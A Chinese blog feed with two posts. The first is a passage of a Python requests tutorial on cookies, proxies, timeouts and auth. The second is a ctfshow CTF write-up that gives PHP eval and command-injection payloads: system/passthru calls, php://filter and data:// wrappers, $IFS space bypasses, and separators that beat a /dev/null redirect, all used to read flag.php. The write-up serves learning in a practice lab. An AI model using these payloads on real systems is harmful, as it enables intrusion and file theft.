title="常见的请求头信息"></a>常见的请求头信息</h3><ul><li><strong>Content-Type</strong>：指示返回内容的类型，例如 <code>text/html</code> 表示返回的是 HTML 文档。</li><li><strong>Content-Length</strong>：表示响应内容的长度（以字节为单位）。</li><li><strong>Server</strong>：标识服务器的类型和版本，如 <code>Apache</code> 或 <code>nginx</code> 等。</li><li><strong>Date</strong>：服务器生成响应的日期和时间。</li><li><strong>Connection</strong>：表示连接状态，如 <code>keep - alive</code> 表示连接将被保持，以便后续请求复用。</li></ul><h3 id="用requests库爬取二进制数据"><a href="#用requests库爬取二进制数据" class="headerlink" title="用requests库爬取二进制数据"></a>用requests库爬取二进制数据</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment">#向资源URL发送一个GET请求</span></span><br><span class="line">r = requests.get(<span class="string">&#x27;https://www.baidu.com/favicon.ico&#x27;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;favicon.ico&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(r.content)</span><br></pre></td></tr></table></figure><ul><li><p><code>&#39;https://www.baidu.com/favicon.ico&#39;</code> 是请求的目标 URL，<code>favicon.ico</code> 通常是网站的图标文件，用于在浏览器的标签页、书签栏等位置显示网站的标志。</p></li><li><p>这行代码会向百度服务器发送一个 GET 请求，请求获取百度的图标文件，并将服务器返回的响应对象赋值给变量 <code>r</code>。</p></li><li><p><code>open()</code> 是 Python 内置的用于打开文件的函数。</p></li><li><p><code>&#39;favicon.ico&#39;</code> 是要保存的文件名，即把下载的图标文件保存为本地的 <code>favicon.ico</code> 文件。</p></li><li><p><code>&#39;wb&#39;</code> 是文件打开模式，其中 <code>w</code> 表示写入模式，<code>b</code> 表示以二进制模式打开文件。因为图标文件是二进制文件，所以需要以二进制模式进行写入。</p></li><li><p><code>with</code> 语句用于创建一个上下文管理器，它会自动处理文件的打开和关闭操作，确保在代码块执行完毕后文件被正确关闭，避免资源泄漏。</p></li><li><p><code>as f</code> 把 <code>open(&#39;favicon.ico&#39;, &#39;wb&#39;)</code> 返回的文件对象赋值给变量 <code>f</code>。之后在 <code>with</code> 语句块里，你就可以使用 <code>f</code> 来调用文件对象的方法，比如 <code>f.write()</code> 用于向文件写入数据</p></li><li><p><code>r.content</code> 是响应对象 <code>r</code> 的一个属性，它返回服务器响应内容的字节形式。</p></li><li><p><code>f.write()</code> 是文件对象 <code>f</code> 的方法，用于将字节数据写入文件。这行代码将下载的图标文件的字节数据写入到本地的 <code>favicon.ico</code> 文件中。</p></li></ul><p>这段代码通过 <code>requests</code> 库发送 GET 请求从百度网站下载其图标文件，并使用 Python 的文件操作将图标文件保存为本地的 <code>favicon.ico</code> 文件。执行这段代码后，在当前工作目录下会生成一个名为 <code>favicon.ico</code> 的文件，该文件即为百度的图标</p><h3 id="用requests库实现文件上传"><a href="#用requests库实现文件上传" class="headerlink" title="用requests库实现文件上传"></a>用requests库实现文件上传</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment">#以二进制方式读取当前目录下的favicon.ico文件，并将其赋给file</span></span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>:<span class="built_in">open</span>(<span class="string">&#x27;favicon.ico&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)&#125;</span><br><span class="line"><span class="comment">#进行上传</span></span><br><span class="line">r = requests.post(<span class="string">&#x27;http://httpbin.org/post&#x27;</span>,files=files)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="处理Cookie"><a href="#处理Cookie" class="headerlink" title="处理Cookie"></a>处理Cookie</h3><img src="/2025/04/21/requests%E5%BA%93%E7%9A%84%E5%AD%A6%E4%B9%A0/04/21/requests%E5%BA%93%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20250421210254912.png" class title="image-20250421210254912"><img src="/2025/04/21/requests%E5%BA%93%E7%9A%84%E5%AD%A6%E4%B9%A0/04/21/requests%E5%BA%93%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20250421210326218.png" class title="image-20250421210326218"><h3 id="会话维持"><a href="#会话维持" class="headerlink" title="会话维持"></a>会话维持</h3><img src="/2025/04/21/requests%E5%BA%93%E7%9A%84%E5%AD%A6%E4%B9%A0/04/21/requests%E5%BA%93%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20250421212624763.png" class title="image-20250421212624763"><h4 id="s-requests-Session"><a href="#s-requests-Session" class="headerlink" title="s = requests.Session()"></a><code>s = requests.Session()</code></h4><p>调用 <code>requests.Session()</code> 函数创建一个会话对象 <code>s</code>。会话对象能在多次请求间保持状态，像 Cookie 信息、连接等，让后续的请求可以复用之前建立的连接，并且自动处理 Cookie 的存储和发送。</p><h4 id="s-get-http-httpbin-org-cookies-set-number-123456789"><a href="#s-get-http-httpbin-org-cookies-set-number-123456789" class="headerlink" title="s.get(&#39;http://httpbin.org/cookies/set/number/123456789&#39;)"></a><code>s.get(&#39;http://httpbin.org/cookies/set/number/123456789&#39;)</code></h4><ul><li>使用会话对象 <code>s</code> 的 <code>get</code> 方法发送一个 GET 请求到 <code>http://httpbin.org/cookies/set/number/123456789</code>。</li><li><code>httpbin.org</code> 是一个专门用于测试 HTTP 请求和响应的网站，<code>/cookies/set/number/123456789</code> 这个接口的作用是设置一个名为 <code>number</code>、值为 <code>123456789</code> 的 Cookie。由于使用的是会话对象，这个 Cookie 会被自动保存到会话中。</li></ul><h4 id="r-s-get-http-httpbin-org-cookies"><a href="#r-s-get-http-httpbin-org-cookies" class="headerlink" title="r = s.get(&#39;http://httpbin.org/cookies&#39;)"></a><code>r = s.get(&#39;http://httpbin.org/cookies&#39;)</code></h4><ul><li>再次使用会话对象 <code>s</code> 的 <code>get</code> 方法发送一个 GET 请求到 <code>http://httpbin.org/cookies</code>。</li><li><code>/cookies</code> 接口的功能是返回当前会话中的所有 Cookie 信息。服务器的响应会被存储在响应对象 <code>r</code> 中</li></ul><h3 id="SSL证书验证"><a href="#SSL证书验证" class="headerlink" title="SSL证书验证"></a>SSL证书验证</h3><img src="/2025/04/21/requests%E5%BA%93%E7%9A%84%E5%AD%A6%E4%B9%A0/04/21/requests%E5%BA%93%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20250421213113557.png" class title="image-20250421213113557"><img src="/2025/04/21/requests%E5%BA%93%E7%9A%84%E5%AD%A6%E4%B9%A0/04/21/requests%E5%BA%93%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20250421213126517.png" class title="image-20250421213126517"><p>代理设置<br>对于某些网站，在测试的时候请求几次，能正常获取内容。但是一旦开始大规模、频繁地爬取，网站可能会弹出验证码，或者跳转到登录验证页面，更有甚者可能会直接封禁客户端的IP，导致一定时间内无法访问。为了防止这种情况，我们需要使用代理来解决这个问题，这就需要用到proxies                  </p><p>1)设置代理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">proxies = &#123;</span><br><span class="line">  <span class="comment">#该代理服务器在免费代理网站上得到的，这样的网站有很多</span></span><br><span class="line">    <span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://161.35.4.201:80&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;https&#x27;</span>: <span class="string">&#x27;https://161.35.4.201:80&#x27;</span> </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    response = requests.get(<span class="string">&#x27;http://httpbin.org/get&#x27;</span>, proxies=proxies)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"><span class="keyword">except</span> requests.exceptions.ConnectionError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Error&#x27;</span>, e.args)</span><br></pre></td></tr></table></figure><ul><li><p><code>proxies</code> 是一个字典，其键值对指定了不同协议（<code>http</code> 和 <code>https</code>）对应的代理服务器地址。</p></li><li><p><code>&#39;http&#39;: &#39;http://161.35.4.201:80&#39;</code> 表明当发送 HTTP 请求时，会使用 <code>161.35.4.201</code> 这个 IP 地址、端口号为 <code>80</code> 的代理服务器。</p></li><li><p><code>&#39;https&#39;: &#39;https://161.35.4.201:80&#39;</code> 意味着发送 HTTPS 请求时，同样会使用该代理服务器。</p></li><li><p><code>try</code> 块</p><p>：</p><ul><li><code>requests.get(&#39;http://httpbin.org/get&#39;, proxies=proxies)</code>：调用 <code>requests</code> 库的 <code>get</code> 方法发送一个 GET 请求到 <code>http://httpbin.org/get</code>，并通过 <code>proxies</code> 参数指定使用之前定义的代理服务器。</li><li><code>print(response.text)</code>：若请求成功，将服务器返回的响应内容以字符串形式打印出来。<code>httpbin.org</code> 的 <code>/get</code> 接口会返回包含请求信息（如请求头、请求参数等）的 JSON 数据。</li></ul></li><li><p><code>except</code> 块</p><p>：</p><ul><li><code>except requests.exceptions.ConnectionError as e</code>：捕获可能出现的连接错误异常。当无法连接到代理服务器或者目标服务器时，会抛出 <code>ConnectionError</code> 异常。</li><li><code>print(&#39;Error&#39;, e.args)</code>：若捕获到异常，打印错误信息，<code>e.args</code> 包含了异常的详细参数</li></ul></li></ul><p>超时设置<br>在本机网络状况不好或者服务器网络响应太慢甚至无响应时，我们可能会等待特别久的时间才可能收到响应，甚至到最后收不到响应而报错。为了应对这种情况，应设置一个超时时间，这个时间是计算机发出请求到服务器返回响应的时间，如果请求超过了这个超时时间还没有得到响应，就抛出错误。这就需要使用timeout参数实现，单位为秒</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>）指定请求总的超时时间</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment">#向淘宝发出请求，如果1秒内没有得到响应，则抛出错误</span></span><br><span class="line">r = requests.get(<span class="string">&#x27;https://www.taobao.com&#x27;</span>,timeout=<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(r.status_code)</span><br></pre></td></tr></table></figure><p>2）分别指定超时时间。实际上，请求分为两个阶段：连接（connect）和读取（read）。如果给timeout参数指定一个整数值，则超时时 间是这两个阶段的总和；如果要分别指定，就可以传入一个元组，连接超时时间和读取超时时间</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment">#向淘宝发出请求，如果连接阶段5秒内没有得到响应或读取阶段30秒内没有得到响应，则抛出错误</span></span><br><span class="line">r = requests.get(<span class="string">&#x27;https://www.taobao.com&#x27;</span>,timeout=(<span class="number">5</span>,<span class="number">30</span>))</span><br><span class="line"><span class="built_in">print</span>(r.status_code)</span><br></pre></td></tr></table></figure><p>3）如果想永久等待，可以直接timeout设置为None，或者不设置timeout参数，因为它的默认值就是None。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment">#向淘宝发出请求，如果连接阶段5秒内没有得到响应或读取阶段30秒内没有得到响应，则抛出错误</span></span><br><span class="line">r = requests.get(<span class="string">&#x27;https://www.taobao.com&#x27;</span>,timeout=<span class="literal">None</span>))</span><br><span class="line"><span class="built_in">print</span>(r.status_code)</span><br></pre></td></tr></table></figure><h3 id="身份验证"><a href="#身份验证" class="headerlink" title="身份验证"></a>身份验证</h3><img src="/2025/04/21/requests%E5%BA%93%E7%9A%84%E5%AD%A6%E4%B9%A0/04/21/requests%E5%BA%93%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20250421214027917.png" class title="image-20250421214027917"><p>1）此时可以使用requests自带的身份验证功能，通过HTTPBasicAuth类实现。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests.auth <span class="keyword">import</span> HTTPBasicAuth</span><br><span class="line">r = requests.get(<span class="string">&#x27;http://localhost:8080/manager/html&#x27;</span>,auth=HTTPBasicAuth(<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(r.status_code)</span><br></pre></td></tr></table></figure><p> 如果用户名和密码正确的话，返回200状态码；如果不正确，则返回401状态码。也可以不使用HTTPBasicAuth类，而是直接传入一个 元组，它会默认使用HTTPBasicAuth这个类来验证</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests.auth <span class="keyword">import</span> HTTPBasicAuth</span><br><span class="line">r = requests.get(<span class="string">&#x27;http://localhost:8080/manager/html&#x27;</span>,auth=(<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(r.status_code)</span><br></pre></td></tr></table></figure><h2 id="Prepared-Request"><a href="#Prepared-Request" class="headerlink" title="Prepared Request"></a>Prepared Request</h2><p>在学习urllib库时，发送请求如果需要设置请求头，需要通过一个Request对象来表示。在requests库中，存在一个与之类似的类，称为Prepared Request。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> Request,Session</span><br><span class="line">url = <span class="string">&#x27;http://httpbin.org/post&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;germey&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">s = Session()</span><br><span class="line">req = Request(<span class="string">&#x27;POST&#x27;</span>,url,data=data,headers=headers)</span><br><span class="line">prepped = s.prepare_request(req)</span><br><span class="line">r = s.send(prepped)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><h4 id="1-from-requests-import-Request-Session"><a href="#1-from-requests-import-Request-Session" class="headerlink" title="1. from requests import Request, Session"></a>1. <code>from requests import Request, Session</code></h4><p>从 <code>requests</code> 库中导入 <code>Request</code> 和 <code>Session</code> 类。<code>Request</code> 类用于构建 HTTP 请求对象，<code>Session</code> 类用于管理会话，它可以在多个请求之间保持状态，例如 Cookie 信息。</p><h4 id="2-url-http-httpbin-org-post"><a href="#2-url-http-httpbin-org-post" class="headerlink" title="2. url = &#39;http://httpbin.org/post&#39;"></a>2. <code>url = &#39;http://httpbin.org/post&#39;</code></h4><p>定义请求的目标 URL，即要发送 POST 请求的地址。</p><h4 id="3-data-name-germey"><a href="#3-data-name-germey" class="headerlink" title="3. data = {&#39;name&#39;: &#39;germey&#39;}"></a>3. <code>data = &#123;&#39;name&#39;: &#39;germey&#39;&#125;</code></h4><p>定义一个字典 <code>data</code>，其中包含要随请求发送的数据。在这个例子中，数据是一个键值对 <code>&#123;&#39;name&#39;: &#39;germey&#39;&#125;</code>，表示要发送的参数 <code>name</code> 的值为 <code>germey</code>。</p><h4 id="4-headers-User-Agent-Mozilla-5-0-Windows-NT-10-0-Win64-x64-rv-95-0-Gecko-20100101-Firefox-95-0"><a href="#4-headers-User-Agent-Mozilla-5-0-Windows-NT-10-0-Win64-x64-rv-95-0-Gecko-20100101-Firefox-95-0" class="headerlink" title="4. headers = {&#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0&#39;}"></a>4. <code>headers = &#123;&#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0&#39;&#125;</code></h4><p>定义一个字典 <code>headers</code>，其中包含要随请求发送的请求头信息。<code>User-Agent</code> 是一个常见的请求头字段，用于标识客户端的类型和版本信息。这里模拟了 Firefox 浏览器的用户代理信息，让服务器认为请求是由 Firefox 浏览器发出的。</p><h4 id="5-s-Session"><a href="#5-s-Session" class="headerlink" title="5. s = Session()"></a>5. <code>s = Session()</code></h4><p>创建一个 <code>Session</code> 对象 <code>s</code>，用于管理会话。通过会话对象发送请求可以自动处理 Cookie 等状态信息。</p><h4 id="6-req-Request-POST-url-data-data-headers-headers"><a href="#6-req-Request-POST-url-data-data-headers-headers" class="headerlink" title="6. req = Request(&#39;POST&#39;, url, data=data, headers=headers)"></a>6. <code>req = Request(&#39;POST&#39;, url, data=data, headers=headers)</code></h4><p>创建一个 <code>Request</code> 对象 <code>req</code>，用于构建 HTTP 请求。</p><ul><li><code>&#39;POST&#39;</code> 表示请求的方法为 POST。</li><li><code>url</code> 是请求的目标 URL。</li><li><code>data=data</code> 表示将之前定义的 <code>data</code> 字典作为请求的数据发送。</li><li><code>headers=headers</code> 表示将之前定义的 <code>headers</code> 字典作为请求头信息发送。</li></ul><h4 id="7-prepped-s-prepare-request-req"><a href="#7-prepped-s-prepare-request-req" class="headerlink" title="7. prepped = s.prepare_request(req)"></a>7. <code>prepped = s.prepare_request(req)</code></h4><p>调用 <code>Session</code> 对象的 <code>prepare_request</code> 方法，将 <code>Request</code> 对象 <code>req</code> 准备为一个可以发送的请求对象 <code>prepped</code>。这个步骤会对请求进行一些预处理，例如设置默认的请求头、处理编码等。</p><h4 id="8-r-s-send-prepped"><a href="#8-r-s-send-prepped" class="headerlink" title="8. r = s.send(prepped)"></a>8. <code>r = s.send(prepped)</code></h4><p>调用 <code>Session</code> 对象的 <code>send</code> 方法，发送准备好的请求对象 <code>prepped</code>，并将服务器返回的响应对象赋值给变量 <code>r</code>。</p><h4 id="9-print-r-text"><a href="#9-print-r-text" class="headerlink" title="9. print(r.text)"></a>9. <code>print(r.text)</code></h4><p>打印服务器返回的响应内容，<code>r.text</code> 是响应对象 <code>r</code> 的一个属性，它返回服务器返回的响应内容，以字符串形式呈现。</p><p>这里引入了Request，然后用url、data和headers参数构造了一个Request对象，这时需要再调用Session的prepare_request( )方法将其转换为一个Prepared Request对象，然后调用send( )方法发送。这样做的好处时：可以利用Request将请求当作独立的对象来看待，这样在进行队列调度时会非常方便，后面会用它来构造一个Request队列<br>这段代码通过 <code>Request</code> 和 <code>Session</code> 类手动构建并发送了一个 HTTP POST 请求，展示了如何使用 <code>requests</code> 库的高级功能来精细控制请求的构建和发送过程。与直接使用 <code>requests.post()</code> 方法相比，这种方式可以更灵活地处理请求和会话状态。</p><p>参考链接：<a href="https://blog.csdn.net/m0_43404934/article/details/122331463">https://blog.csdn.net/m0_43404934/article/details/122331463</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow29-52</title>
      <link href="/2025/04/13/ctfshow29-52/"/>
      <url>/2025/04/13/ctfshow29-52/</url>
      
        <content type="html"><![CDATA[<p><img src="/2025/04/13/ctfshow29-52/$%7Bfiilename%7D/64ae6cbc-95ca-46c5-9f56-36f524cb1e94.jpg" alt="64ae6cbc-95ca-46c5-9f56-36f524cb1e94">!](.&#x2F;img&#x2F;64ae6cbc-95ca-46c5-9f56-36f524cb1e94.jpg)</p><p>Web29 eval函数表示把后面的内容当成php代码执行，</p><ol><li>?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</li></ol><p>而不能直接?c&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php 因为后面的内容不是标准的php代码</p><ol start="2"><li>?c&#x3D;system(“ls”); 发现有flag.php,又system(“tac fla*”);</li><li>?c&#x3D;echo <code>tac fla*</code>; 注意要用<code> </code>包起来 这个反引号代替了system函数</li></ol><p><img src="/2025/04/13/ctfshow29-52/$%7Bfiilename%7D/b73fb13b-b2e4-4eb4-82a9-cbd6b2f6d225.jpg" alt="b73fb13b-b2e4-4eb4-82a9-cbd6b2f6d225">!](.&#x2F;img&#x2F;b73fb13b-b2e4-4eb4-82a9-cbd6b2f6d225.jpg)</p><p>System被过滤也可以用passthru来替代system执行系统命令</p><p><img src="/2025/04/13/ctfshow29-52/$%7Bfiilename%7D/d359d230-d3cc-45e6-a618-2404d84895db.jpg" alt="d359d230-d3cc-45e6-a618-2404d84895db">!](.&#x2F;img&#x2F;d359d230-d3cc-45e6-a618-2404d84895db.jpg)</p><p>31题 过滤了空格，可以使用%09替代；也可以使用$IFS$9，${IFS}，$IFS这三个都行</p><p>?c&#x3D;eval($_GET[1]);&amp;1&#x3D;passthru(“tac fla*”)；</p><p>?c&#x3D;eval($_GET[1]);&amp;1&#x3D;passthru(“tac${IFS}$fla*”); 注意要用转义字符\</p><p><img src="/2025/04/13/ctfshow29-52/$%7Bfiilename%7D/32038e0e-fe67-4653-b5e1-e81652560b33.jpg" alt="32038e0e-fe67-4653-b5e1-e81652560b33">!](.&#x2F;img&#x2F;32038e0e-fe67-4653-b5e1-e81652560b33.jpg)</p><p>32题 ?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php system("tac flag.php")?></p><p>?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><p><img src="/2025/04/13/ctfshow29-52/$%7Bfiilename%7D/daad7edc-8f4e-4598-9ded-7ec6dac8cfb4.jpg" alt="daad7edc-8f4e-4598-9ded-7ec6dac8cfb4">!](.&#x2F;img&#x2F;daad7edc-8f4e-4598-9ded-7ec6dac8cfb4.jpg)</p><p>38题 看到include 用伪协议 过滤了php 用data ?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?=system(“tac fla*”);?></p><p>?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?=system("tac fla*")?> </p><?=是简化的<?php echo...?><p><img src="/2025/04/13/ctfshow29-52/$%7Bfiilename%7D/9bf5bd18-acb2-4674-a5fe-8e3fdc46b8b5.jpg" alt="9bf5bd18-acb2-4674-a5fe-8e3fdc46b8b5">!](.&#x2F;img&#x2F;9bf5bd18-acb2-4674-a5fe-8e3fdc46b8b5.jpg)</p><p>40题?c&#x3D;echo highlight_file(next(array_reverse(scandir(pos(localeconv())))));：这是一个GET请求的参数c，其值是一个PHP表达式。</p><p>echo：PHP中的输出函数，用于输出字符串或表达式的结果。</p><p>highlight_file：PHP中的函数，用于高亮显示PHP文件的内容。</p><p>next：PHP中的函数，用于将内部指针向前移动到下一个元素。</p><p>array_reverse：PHP中的函数，用于反转数组元素的顺序。</p><p>scandir：PHP中的函数，用于列出目录中的文件和子目录。</p><p>pos：PHP中的函数，返回数组中当前内部指针指向的值。</p><p>localeconv()：PHP中的函数，返回本地化的数字和货币格式信息。</p><p>具体来说，这段代码的执行流程如下：</p><p>localeconv()：获取本地化的数字和货币格式信息。</p><p>pos(localeconv())：获取localeconv()返回数组中当前内部指针指向的值。</p><p>scandir(pos(localeconv()))：列出pos(localeconv())指向的目录中的文件和子目录。</p><p>array_reverse(scandir(pos(localeconv())))：反转这些文件和子目录的顺序。</p><p>next(array_reverse(scandir(pos(localeconv()))))：将内部指针移动到下一个元素，即下一个文件或子目录。</p><p>highlight_file(next(array_reverse(scandir(pos(localeconv())))))：高亮显示这个文件的内容。</p><p>echo：输出这个高亮显示的内容。</p><p>payload2：</p><p>?c&#x3D;eval(next(reset(get_defined_vars())));&amp;1&#x3D;;system(“tac%20flag.php”);</p><p>1</p><p>payload2解释：</p><p>?c&#x3D;eval(next(reset(get_defined_vars())));：这是GET请求的一部分，其中c参数的值是一个PHP表达式。</p><p>get_defined_vars()：这个函数返回当前所有已定义变量的数组，包括局部变量和全局变量。</p><p>reset()：这个函数将数组内部指针指向第一个元素，并返回该元素的值。</p><p>next()：这个函数将数组内部指针向前移动一位，并返回当前指针处的元素值。</p><p>eval()：这个函数执行字符串作为PHP代码。</p><p>这段代码的目的是尝试执行get_defined_vars()返回的第一个元素的下一个元素的值作为PHP代码。</p><p>&amp;1&#x3D;;system(“tac%20flag.php”);：这是GET请求的另一部分，尝试通过URL参数执行系统命令。</p><p>system()：这个函数执行一个shell命令，并将完整的输出返回。</p><p>“tac%20flag.php”：这里的命令是tac flag.php，tac是反向输出文件内容的Unix命令，%20是URL编码的空格。</p><p>这段代码的目的是尝试执行flag.php文件的反向内容。</p><p>​            </p><p>原文链接：<a href="https://blog.csdn.net/LongL_GuYu/article/details/140787997">https://blog.csdn.net/LongL_GuYu/article/details/140787997</a></p><p><img src="/2025/04/13/ctfshow29-52/$%7Bfiilename%7D/a8e336e1-6ad1-4687-abfe-ab869ccdb701.jpg" alt="a8e336e1-6ad1-4687-abfe-ab869ccdb701">!](.&#x2F;img&#x2F;a8e336e1-6ad1-4687-abfe-ab869ccdb701.jpg)</p><p> dev&#x2F;null 2&gt;&amp;1 </p><p><strong>·</strong> <em><strong>*command &gt; &#x2F;dev&#x2F;null*</strong></em> ：符号 &gt; 是重定向操作符，此命令将 command 的标准输出重定向到 &#x2F;dev&#x2F;null ，即正常运行结果被丢弃。例如 echo “Hello” &gt; &#x2F;dev&#x2F;null ，屏幕上不会显示 “Hello” 。</p><p><strong>·</strong> <em><strong>*command 2&gt; &#x2F;dev&#x2F;null*</strong></em> ：2&gt; 用于将标准错误输出重定向，该命令会把 command 执行过程中产生的错误信息发送到 &#x2F;dev&#x2F;null 。比如 find &#x2F; -name non_existent_file 2&gt;&#x2F;dev&#x2F;null ，查找过程中因权限不足等产生的错误提示就不会显示 。</p><p><strong>·</strong> <em><strong>*command &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1*</strong></em><em><strong>*（等价于*</strong></em> <em><strong>*command &amp;&gt; &#x2F;dev&#x2F;null*</strong></em> <em><strong>*）*</strong></em> ：</p><p>· &gt; 先将标准输出重定向到 &#x2F;dev&#x2F;null 。</p><p>· 2&gt;&amp;1 中 2 代表标准错误输出，&amp; 表示绑定，1 是标准输出，即把标准错误输出绑定到标准输出，由于标准输出已定向到 &#x2F;dev&#x2F;null ，所以标准错误输出也被定向到 &#x2F;dev&#x2F;null ，命令所有输出都被丢弃。常用于不想看到命令任何输出，或避免输出干扰、减少日志量等场景 。比如在运行一些后台脚本任务时，可让其输出不显示在终端 。</p><p>解法1 ?c&#x3D;ls;  ?c&#x3D;tac fla.php; ;后面为空，丢进黑洞的就是空 当用户传入 tac flag.php;ls 时，实际执行的命令变为 tac flag.php;ls &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1。此时，重定向操作 &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1 只对 ls 命令生效，因为它是重定向符号后面紧邻的命令，而 tac flag.php 命令不受影响，其输出会正常显示，从而绕过了 &#x2F;dev&#x2F;null 对输出的屏蔽</p><p>解法2 ?c&#x3D;tac flag.php||  逻辑或|| 当有一个为真则为真，A||B 若A为真，则只进行A 不管B </p><p>解法3  ?c&#x3D;ls%26  &amp;的URL编码是%26   在命令 ls &amp; &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1 中，重定向操作 &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1 是针对 &amp; 之后的部分，而 &amp; 会将 ls 命令放到后台执行，使得 ls 命令独立于重定向操作。也就是说，重定向操作无法影响到已经被放到后台执行的 ls 命令，所以 ls 命令的输出不会被重定向到 &#x2F;dev&#x2F;null，而是正常显示出来。 &amp; 也可以看作是命令分隔符的一种特殊形式。它和分号 ; 类似，都能分隔多个命令，但 &amp; 会让前面的命令在后台运行。</p><p>?c&#x3D;ls%26%26 同理</p><p>逻辑与运算符&amp;&amp; 条件1&amp;&amp;条件2 当1为真继续2 若1为假 则2就不管了 </p><p>按位与运算符&amp; 用于对两个整数的二进制位进行逐位比较。只有当两个对应位都为 1 时，结果的该位才为 1，否则为 0。</p><p>当用于布尔值时，&amp; 也可以作为逻辑与运算符，但它不具有短路特性。无论第一个表达式的结果如何，都会计算第二个表达式。</p><p>解法4 ?c&#x3D;ls%0a  ?c&#x3D;tac flag.php%0a 在 URL 编码里，%0a 代表换行符（\n） 